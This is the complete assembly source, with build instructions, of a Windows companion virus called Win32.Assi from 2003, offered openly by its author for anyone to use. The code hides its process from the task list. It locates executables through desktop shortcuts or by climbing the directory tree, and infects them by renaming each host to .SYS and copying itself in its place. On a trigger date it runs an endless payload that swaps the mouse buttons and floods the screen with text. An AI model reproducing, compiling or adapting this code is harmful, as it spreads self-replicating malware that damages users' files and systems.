   ; COMMENT#
   ; ____________________________________________________________________________________________
   ;                                       Win32.Assi
   ;                                 aka Win32.DesktopLover
   ;                                      Version  1.0
   ;                                   Another  Companion
   ;                                  coded by DiA (c)2oo3
   ;                             http://www.anzwers.net/free/dia
   ;                                        Germany
   ; ____________________________________________________________________________________________
   ;
   ; Intro:
   ;    OK, another Comapnion I coded! Must I rename my Nick in Mr.Companion? NO! I work
   ;    on a PE Appender, but it don't work very well, to many Bugs... But I work!
   ;
   ; Disclaimer:
   ;    I am NOT responsible for any damage that you do! You can need the code however you want..
   ;    My motherlanguage is not English, I hope you understand what I mean.
   ;    Feel FREE to write any Comments to
   ;                                        DiA_hates_machine@gmx.de
   ;
   ; What's NOT New:
   ;    -the infection routine
   ;    -the cd.. method
   ;    -the method to get Host's Name
   ;     AND WHAT'S FUCKIN NEW?!?
   ;
   ; What's New:
   ;    -The Virus search in *.lnk Files for the Directory includes the *.exe file(s)
   ;
   ; How does it works:
   ;    -first get the Host's .SYS Name
   ;    -run Host
   ;    -it's a two way Virus
   ;    -check Date...
   ;    -if Date<15th do LNK_Method
   ;    -if Date>15th do CD_Method
   ;
   ; LNK_Method:
   ;    -Get the Desktop Directory from the Registry
   ;    -Go to the Directory
   ;    -search for *.lnk files
   ;    -Read this *.lnk file
   ;    -scan to find the Directory included the *.exe
   ;    -Go to this Directory
   ;    -Infect all files
   ;    -Go back to the Desktop Folder
   ;    -if any Errors in this method do the CD_Method
   ;    -Find more *.lnk
   ;    -if No more *.lnk check for Payload Date
   ;    -if no Payload Date, exit Virus
   ;
   ; CD_Method:
   ;    -see my Tut about cd.. Traveling
   ;    -infect current Directory
   ;    -cd..
   ;    -infect this Diretory
   ;    -C:\ --> exit Virus
   ;
   ; Payload:
   ;    -on the 1. January
   ;    -first show a Message
   ;    -after that a DC Message follow the Mouse Cursor
   ;    -it Bombs the screen with the Message: "ASSI.DiA"
   ;    -Swap's the Mouse Buttons
   ;    -can't stop with CTRL-ALT-DEL
   ;
   ; Outro:
   ;    -T H E   O N E   A N D   R E A L   A S S i   ! ! !

   First Generation:
   ;-----FirstGen.asm--------------------------------------------------------------------------
   .386
   .model flat
   jumps

   extrn MessageBoxA   :PROC
   extrn ExitProcess   :PROC

   .data
   oTitle  db 'Win32.Assi - First Generation',0
   oMsg    db 'Win32.Assi aka Win32.DesktopLover',10,13
       db 'coded by DiA (c)03 [Germany]',10,13,10,13
       db 'THE ONE AND REAL ASSI',0

   .code
   FirstGen:
   push 0
   push offset oTitle
   push offset oMsg
   push 0
   call MessageBoxA

   push 0
   call ExitProcess
   end FirstGen
   ;-----FirstGen.asm-END----------------------------------------------------------------------

   To Compile:
      -First Generation
         TASM32 /z /ml /m3 FirstGen,,;
         TLINK32 -Tpe -c -aa FirstGen,FirstGen,,
         rename FirstGen.EXE Assi.SYS

      -Win32.Assi
         TASM32 /z /ml /m3 Assi,,;
         TLINK32 -Tpe -c -aa Assi,Assi,,

      -Assi.EXE and Assi.SYS must be in ONE Directory

   The:
      END
   ____________________________________________________________________________________________
                                         Win32.Assi
                                   aka Win32.DesktopLover
                                        Version  1.0
                                     Another  Companion
                                    coded by DiA (c)2oo3
                               http://www.anzwers.net/free/dia
                                          Germany
   ____________________________________________________________________________________________
   #



   ;-------------------------------------------------------------------------------------------
   ;-----Head----------------------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   .386
   .model flat
   jumps
   ;-------------------------------------------------------------------------------------------
   ;-----Head-END------------------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----API's---------------------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   extrn GetCurrentProcessId       :PROC
   extrn RegisterServiceProcess        :PROC
   extrn GetCommandLineA           :PROC
   extrn lstrcpyA              :PROC
   extrn CreateProcessA            :PROC
   extrn GetCurrentDirectoryA      :PROC
   extrn GetSystemTime         :PROC
   extrn RegOpenKeyExA         :PROC
   extrn RegQueryValueExA          :PROC
   extrn RegCloseKey           :PROC
   extrn SetCurrentDirectoryA      :PROC
   extrn FindFirstFileA            :PROC
   extrn OpenFile              :PROC
   extrn ReadFile              :PROC
   extrn CloseHandle           :PROC
   extrn FindNextFileA         :PROC
   extrn CopyFileA             :PROC
   extrn SwapMouseButton           :PROC
   extrn CreateDCA             :PROC
   extrn TextOutA              :PROC
   extrn GetCursorPos          :PROC
   extrn SetTextColor          :PROC
   extrn SetBkMode             :PROC
   extrn MessageBoxA           :PROC
   extrn ExitProcess           :PROC
   ;-------------------------------------------------------------------------------------------
   ;-----API's-END-----------------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----Data's--------------------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   .data?
   FileBuffer      db 1d dup (?)
   Buffer          db 1d dup (?)
   Path            db 1d dup (?)

   .data                       ;here comes the datas
   AssiFile        db 260d dup (0)
   HostFile        db 260d dup (0)

   ProcessInfo     dd 4 dup (0)
   StartupInfo     dd 4 dup (0)

   CurrentDir      db 260d dup (0)

   CDdotdot        db 260d dup (0)

   RegHandle       dd 0
   lpType          dd 0
   Size            dd 100d
   Desktop         db 100d dup (0)
   SubKey          db 'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',0
   Value           db 'Desktop',0

   LNKmask         db '*.lnk',0
   LNKfindhandle       dd 0

   LNKhandle       dd 0
   ReadBuffer      dd 0

   EXEmask         db '*.exe',0
   EXEfindhandle       dd 0

   DisplayDC       db 'DISPLAY',0
   DChandle        dd 0
   AssiDiA         db 'ASSI.DiA',0

   oTitle          db 'Win32.Assi aka Win32.DesktopLover',0
   oMsg            db '              !THE ONE AND REAL ASSI!',10,13,10,13
               db '              coded by DiA (c)2oo3 [GER]',10,13
               db '           http://www.anzwers.net/free/dia',10,13,10,13
               db '                     knock and have fun...',0

   SYSTEMTIME:
   wYear           WORD ?
   wMonth              WORD ?
   wDayOfWeek          WORD ?
   wDay                WORD ?
   wHour               WORD ?
   wMinute             WORD ?
   wSecond             WORD ?
   wMilliseconds       WORD ?

   FILETIME        STRUC
   FT_dwLoeDateTime    dd ?
   FT_dwHighDateTime   dd ?
   FILETIME        ENDS

   WIN32_FIND_DATA         label    byte
   WFD_dwFileAttributes    dd       ?
   WFD_ftCreationTime      FILETIME ?
   WFD_ftLastAccessTime    FILETIME ?
   WFD_ftLastWriteTime     FILETIME ?
   WFD_nFileSizeHigh       dd       ?
   WFD_nFileSizeLow        dd       ?
   WFD_dwReserved0         dd       ?
   WFD_dwReserved1         dd       ?
   WFD_szFileName          db       260d dup (?)
   WFD_szAlternateFileName db       13   dup (?)
   WFD_szAlternateEnding   db       03   dup (?)

   POINT:
   x           dword ?
   y           dword ?
   ;-------------------------------------------------------------------------------------------
   ;-----Data's-END----------------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----Hide Assi Process---------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   .code

   Assi:
   call GetCurrentProcessId            ;to hide the virus

   push 1                      ;anti-ctrl-alt-del
   push eax                    ;id
   call RegisterServiceProcess
   ;-------------------------------------------------------------------------------------------
   ;-----Hide Assi Process-END-----------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----Restore HostName and run Host---------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   call GetCommandLineA                ;get virus filename

   inc eax                     ;clear the first "
   push eax
   push offset AssiFile
   call lstrcpyA                   ;copy string

   mov esi, offset AssiFile
   call GetPoint

   add esi,4d
   mov dword ptr [esi],00000000h

   push offset AssiFile
   push offset HostFile
   call lstrcpyA                   ;to get hosts name

   mov esi, offset HostFile
   call GetPoint
   mov dword ptr [esi],5359532Eh           ;rename to .SYS

   push offset ProcessInfo
   push offset StartupInfo
   push 0
   push 0
   push 10h
   push 0
   push 0
   push 0
   push offset HostFile
   push offset HostFile
   call CreateProcessA             ;run the host file
   ;-------------------------------------------------------------------------------------------
   ;-----Restore HostName and run Host-END-----------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----Save Current Directory----------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   push offset CurrentDir              ;save the current dir, for CD_Method
   push 260d
   call GetCurrentDirectoryA
   ;-------------------------------------------------------------------------------------------
   ;-----Save Current Directory-END------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----LNK_Method or CD_Method?--------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   push offset SYSTEMTIME              ;get the day
   call GetSystemTime              ; *.lnk search method < 15th < cd.. method

   cmp word ptr [wDay],15
   jae CD_Method                   ; if over 15th do the CD_Method
   ;-------------------------------------------------------------------------------------------
   ;-----LNK_Method or CD_Method?-END----------------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----*LNK_Method* Get Desktop Dir----------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   push offset RegHandle               ;get the desktop folder with the registry
   push 001F0000h                  ;r&w
   push 0
   push offset SubKey
   push 80000001h                  ;HKEY_CURRENT_USER
   call RegOpenKeyExA

   test eax,eax                    ;error?
   jnz CD_Method                   ;if yes do the method

   push offset Size                ;read desktop folder and save
   push offset Desktop
   push offset lpType
   push 0
   push offset Value
   push dword ptr [RegHandle]
   call RegQueryValueExA

   test eax,eax                    ;error
   jnz CD_Method

   push dword ptr [RegHandle]
   call RegCloseKey                ;close handle

   push offset Desktop             ;change dir
   call SetCurrentDirectoryA
   ;-------------------------------------------------------------------------------------------
   ;-----Get Desktop Dir-END-------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----Search *.lnk and scan for Directory---------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   push offset WIN32_FIND_DATA         ;search for *.lnk
   push offset LNKmask             ;*.lnk
   call FindFirstFileA
   mov dword ptr [LNKfindhandle],eax       ;save handle
   cmp eax,-1                  ;nothing found?
   je CD_Method                    ;other method

   FindNextLNK:                    ;find more filez
   test eax,eax                    ;no more?
   jz CheckPayload                 ;then check for day and month

   push 2                      ;open the *.lnk file to get the dir
   push offset FileBuffer
   push offset WFD_szFileName
   call OpenFile
   mov dword ptr [LNKhandle],eax           ;save handle

   push 0
   push offset ReadBuffer
   push 2000d
   push offset Buffer
   push dword ptr [LNKhandle]
   call ReadFile

   push dword ptr [LNKhandle]          ;close handle
   call CloseHandle

   lea esi,[Buffer+103d]               ;go 103d after buffer:
   mov edi,esi
   xor ecx,ecx                 ;null

   SearchDir:                  ;get it now
   lodsb
   cmp eax,':'
   je CopyDir                  ;if found C: copy dir
   stosb
   inc ecx
   jmp SearchDir

   CopyDir:                    ;Copy it to string
   stosb
   sub esi,2d
   mov edi,offset Path             ;to path in data?:
   Copy:
   lodsb
   cmp eax,'.'
   je HaveDir                  ;ive got it
   stosb
   jmp Copy                    ;search again

   HaveDir:
   stosb

   mov esi,offset Path             ;get point to generate full dir
   call GetPoint
   call GetSlash                   ;make the dir

   inc esi
   mov dword ptr [esi],00000000h

   push offset Path                ;change to this dir
   call SetCurrentDirectoryA

   call InfectCurrentDir               ;infect all files in dir

   push offset Desktop             ;more lnks!
   call SetCurrentDirectoryA

   push offset WIN32_FIND_DATA         ;search more
   push dword ptr [LNKfindhandle]
   call FindNextFileA
   jmp FindNextLNK
   ;-------------------------------------------------------------------------------------------
   ;-----Search *.lnk and scan for Directory-END-----------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----Payload-------------------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   CheckPayload:
   cmp word ptr [wMonth],1             ;1th month + 2th day = payload  =)
   jne Exit
   cmp word ptr [wDay],2
   jne Exit

   push 0                      ;little message
   push offset oTitle
   push offset oMsg
   push 0
   call MessageBoxA

   push 0                      ;visual
   push 0
   push 0
   push offset DisplayDC
   call CreateDCA
   mov dword ptr [DChandle],eax            ;save handle

   push 0
   push dword ptr [DChandle]
   call SetTextColor               ;black

   push 4d                     ;transparent
   push dword ptr [DChandle]
   call SetBkMode

   Payload:                    ;=))
   push 1                      ;swap mouse button
   call SwapMouseButton

   push offset POINT
   call GetCursorPos

   mov eax,20d
   add eax,x                   ;x coor +20

   push 8d
   push offset AssiDiA
   push y                      ;y coor
   push x                      ;x coor
   push dword ptr [DChandle]
   call TextOutA

   push 0                      ;swap agian...
   call SwapMouseButton
   jmp Payload
   ;-------------------------------------------------------------------------------------------
   ;-----Payload-END---------------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----*CD_Method* Generate Directorys and infect--------------------------------------------
   ;-------------------------------------------------------------------------------------------
   CD_Method:                  ;cd..
   push offset CurrentDir              ;if error in the LNK_Method, set from
   call SetCurrentDirectoryA           ;desktop folder to current folder on start

   push offset AssiFile
   push offset CDdotdot
   call lstrcpyA                   ;copy string to use

   mov esi,offset CDdotdot             ;not need
   call GetPoint                   ;prepare for cd.. method
   mov dword ptr [esi],00000000h

   MakeDir:                    ;generate the name
   cmp byte ptr [esi],'\'
   jz SetDir
   cmp byte ptr [esi],':'
   jz Exit                     ;now at C:
   dec esi
   jmp MakeDir

   SetDir:
   inc esi
   mov dword ptr [esi],00000000h
   sub esi,2d
   push esi

   push offset CDdotdot                ;set dir to infect
   call SetCurrentDirectoryA

   call InfectCurrentDir

   pop esi
   jmp MakeDir                 ;again...
   ;-------------------------------------------------------------------------------------------
   ;-----Generate Directorys and infect-END----------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----Exit Assi-----------------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   Exit:
   push 0
   call ExitProcess
   ;-------------------------------------------------------------------------------------------
   ;-----Exit Assi-END-------------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----GetPoint Procedure--------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   GetPoint:
   cmp byte ptr [esi],'.'
   jz PointFound
   inc esi
   jmp GetPoint
   PointFound:
   ret
   ;-------------------------------------------------------------------------------------------
   ;-----GetPoint Procedure-END----------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----GetSlash Procedure--------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   GetSlash:
   cmp byte ptr [esi],'\'
   jz SlashFound
   dec esi
   jmp GetSlash
   SlashFound:
   ret
   ;-------------------------------------------------------------------------------------------
   ;-----GetSlash Procedure-END----------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----InfectCurrentDir Procedure------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   InfectCurrentDir:
   push offset WIN32_FIND_DATA         ;find exe files
   push offset EXEmask
   call FindFirstFileA
   mov dword ptr [EXEfindhandle],eax       ;save handle
   cmp eax,-1
   je Exit

   FindNextEXE:
   test eax,eax                    ;no more?
   jz InfectDone                   ;yes->exit

   push offset WFD_szFileName
   push offset HostFile                ;not needed
   call lstrcpyA                   ;copy string

   mov esi,offset HostFile
   call GetPoint                   ;get point to rename it
   mov dword ptr [esi],5359532Eh           ;SYS.

   push 1                      ;do't copy if *.sys already exist
   push offset HostFile
   push offset WFD_szFileName
   call CopyFileA

   push 0                      ;copy alwayss
   push offset WFD_szFileName
   push offset AssiFile
   call CopyFileA

   push offset WIN32_FIND_DATA         ;more hosts!
   push dword ptr [EXEfindhandle]
   call FindNextFileA
   jmp FindNextEXE

   InfectDone:
   ret
   ;-------------------------------------------------------------------------------------------
   ;-----InfectCurrentDir Procedure-END--------------------------------------------------------
   ;-------------------------------------------------------------------------------------------



   ;-------------------------------------------------------------------------------------------
   ;-----Foot----------------------------------------------------------------------------------
   ;-------------------------------------------------------------------------------------------
   end Assi
   ;-------------------------------------------------------------------------------------------
   ;-----Foot-END------------------------------------------------------------------------------
   ;---------------------------------------------------------by DiA (c)2oo3 [Germany]----------
